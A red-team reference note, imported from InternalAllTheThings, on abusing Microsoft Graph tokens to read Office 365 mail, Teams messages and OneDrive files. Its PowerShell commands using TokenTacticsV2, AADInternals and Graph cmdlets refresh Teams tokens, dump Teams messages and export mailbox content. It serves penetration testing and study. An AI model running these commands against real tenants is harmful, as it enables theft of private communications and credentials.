---
title: Azure Services - Office 365
type: technique
tags: [azure, cloud, exploitation, m365, reference-import]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Azure Services - Office 365

## What it is

Technical reference for **Azure Services - Office 365** collected from InternalAllTheThings during an internal/cloud assessment ingest.

## How it works

Office 365 services (Teams, Outlook, OneDrive, SharePoint) are accessible via Microsoft Graph API tokens, and an attacker with a valid access token for the `https://graph.microsoft.com` resource can read emails, Teams messages, and OneDrive files for any user they have delegated or application permissions over. Teams messages frequently contain credentials, sensitive business discussions, and MFA backup codes that are valuable for lateral movement. Global Administrator and Exchange Administrator roles grant mailbox access to all users, making these roles high-value targets for establishing persistent data access.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## Microsoft Teams Messages

```ps1
TokenTacticsV2> RefreshTo-MSTeamsToken -domain domain.local
AADInternals> Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName
```

## Outlook Mails

* Read user mails

```ps1
Get-MgUserMessage -UserId <user-id> | ft
Get-MgUserMessageContent -OutFile mail.txt -UserId <user-id> -MessageId <message-id>
```

## OneDrive Files

```ps1
$userId = "<user-id>"
Import-Module Microsoft.Graph.Files
Get-MgUserDefaultDrive -UserId $userId
Get-MgUserDrive -UserId $UserId  -Debug
Get-MgDrive -top 1
```

## References

* [Pentesting Azure Mindmap - Alexis Danizan](https://github.com/synacktiv/Mindmaps)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
